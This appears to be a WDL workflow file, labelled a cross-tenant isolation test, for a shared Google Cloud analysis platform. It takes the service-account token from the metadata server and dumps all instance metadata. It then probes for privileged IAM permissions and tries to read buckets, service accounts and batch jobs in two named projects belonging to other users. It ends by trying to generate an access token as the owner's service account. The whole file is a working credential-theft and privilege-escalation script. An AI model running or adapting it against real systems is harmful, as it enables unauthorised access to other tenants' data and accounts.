version 1.0

workflow CrossTenantTest {
    call CheckAccess
}

task CheckAccess {
    command <<<
        echo "=== CROSS-TENANT ISOLATION TEST ==="
        echo "Date: $(date -u)"
        echo ""

        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
        PROJECT=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null)
        SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null)

        echo "=== 1. WHO AM I ==="
        echo "Project: $PROJECT"
        echo "SA: $SA_EMAIL"
        echo ""

        # Can writer see other projects in the org/folder?
        echo "=== 2. LIST ALL VISIBLE PROJECTS ==="
        curl -s \
          "https://cloudresourcemanager.googleapis.com/v1/projects" \
          -H "Authorization: Bearer $TOKEN" 2>&1
        echo ""

        # What IAM permissions does writer SA have?
        echo "=== 3. OUR PERMISSIONS (testIamPermissions) ==="
        curl -s -X POST \
          "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:testIamPermissions" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{
            "permissions": [
              "resourcemanager.projects.get",
              "resourcemanager.projects.getIamPolicy",
              "resourcemanager.projects.setIamPolicy",
              "resourcemanager.projects.list",
              "compute.instances.list",
              "compute.instances.create",
              "storage.buckets.list",
              "storage.buckets.create",
              "storage.objects.list",
              "storage.objects.get",
              "storage.objects.create",
              "storage.objects.delete",
              "iam.serviceAccounts.list",
              "iam.serviceAccounts.create",
              "iam.serviceAccounts.getAccessToken",
              "iam.serviceAccountKeys.create",
              "bigquery.datasets.list",
              "bigquery.jobs.create",
              "logging.logEntries.list",
              "secretmanager.secrets.list",
              "secretmanager.versions.access",
              "batch.jobs.list",
              "batch.jobs.create"
            ]
          }' 2>&1
        echo ""

        # Try to access owner's workspace project (wb-golden-plum-6731)
        echo "=== 4. ACCESS OWNER PROJECT (wb-golden-plum-6731) ==="
        echo "--- Project info ---"
        curl -s \
          "https://cloudresourcemanager.googleapis.com/v1/projects/wb-golden-plum-6731" \
          -H "Authorization: Bearer $TOKEN" 2>&1
        echo ""

        echo "--- Buckets in owner project ---"
        curl -s \
          "https://storage.googleapis.com/storage/v1/b?project=wb-golden-plum-6731" \
          -H "Authorization: Bearer $TOKEN" 2>&1
        echo ""

        # Try to read owner's workspace bucket directly
        echo "--- Read owner bucket contents ---"
        gcloud storage ls gs://storage-papyge-wb-golden-plum-6731/ 2>&1 | head -30
        echo ""

        # Try to read owner's workflow outputs
        echo "--- Read owner workflow outputs ---"
        gcloud storage ls gs://storage-papyge-wb-golden-plum-6731/ --recursive 2>&1 | head -50
        echo ""

        # Try to access the other project we found
        echo "=== 5. ACCESS OTHER PROJECT (wb-sparkly-turnip-3673) ==="
        echo "--- Project info ---"
        curl -s \
          "https://cloudresourcemanager.googleapis.com/v1/projects/wb-sparkly-turnip-3673" \
          -H "Authorization: Bearer $TOKEN" 2>&1
        echo ""

        echo "--- Buckets ---"
        curl -s \
          "https://storage.googleapis.com/storage/v1/b?project=wb-sparkly-turnip-3673" \
          -H "Authorization: Bearer $TOKEN" 2>&1
        echo ""

        # List SAs in both projects
        echo "=== 6. SERVICE ACCOUNTS ==="
        echo "--- SAs in our project ---"
        curl -s \
          "https://iam.googleapis.com/v1/projects/$PROJECT/serviceAccounts" \
          -H "Authorization: Bearer $TOKEN" 2>&1
        echo ""

        echo "--- SAs in owner project ---"
        curl -s \
          "https://iam.googleapis.com/v1/projects/wb-golden-plum-6731/serviceAccounts" \
          -H "Authorization: Bearer $TOKEN" 2>&1
        echo ""

        # IAM policy — can writer see who else has access?
        echo "=== 7. IAM POLICY OF OUR PROJECT ==="
        curl -s -X POST \
          "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:getIamPolicy" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{}' 2>&1
        echo ""

        # Metadata — full dump
        echo "=== 8. METADATA DUMP ==="
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/?recursive=true" 2>&1 | \
          python3 -m json.tool 2>/dev/null || \
          curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/?recursive=true" 2>&1
        echo ""

        # Batch jobs — can writer see owner's jobs?
        echo "=== 9. BATCH JOBS IN OUR PROJECT ==="
        curl -s \
          "https://batch.googleapis.com/v1/projects/$PROJECT/locations/us-central1/jobs" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -100
        echo ""

        echo "--- Batch jobs in owner project ---"
        curl -s \
          "https://batch.googleapis.com/v1/projects/wb-golden-plum-6731/locations/us-central1/jobs" \
          -H "Authorization: Bearer $TOKEN" 2>&1 | head -100
        echo ""

        # Can writer access owner's SA token?
        echo "=== 10. IMPERSONATE OWNER SA ==="
        OWNER_SA="pet-2778175469911ac304b8a@wb-golden-plum-6731.iam.gserviceaccount.com"
        curl -s -X POST \
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${OWNER_SA}:generateAccessToken" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' 2>&1
        echo ""

        echo "=== DONE ==="
    >>>

    output {
        File result = stdout()
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
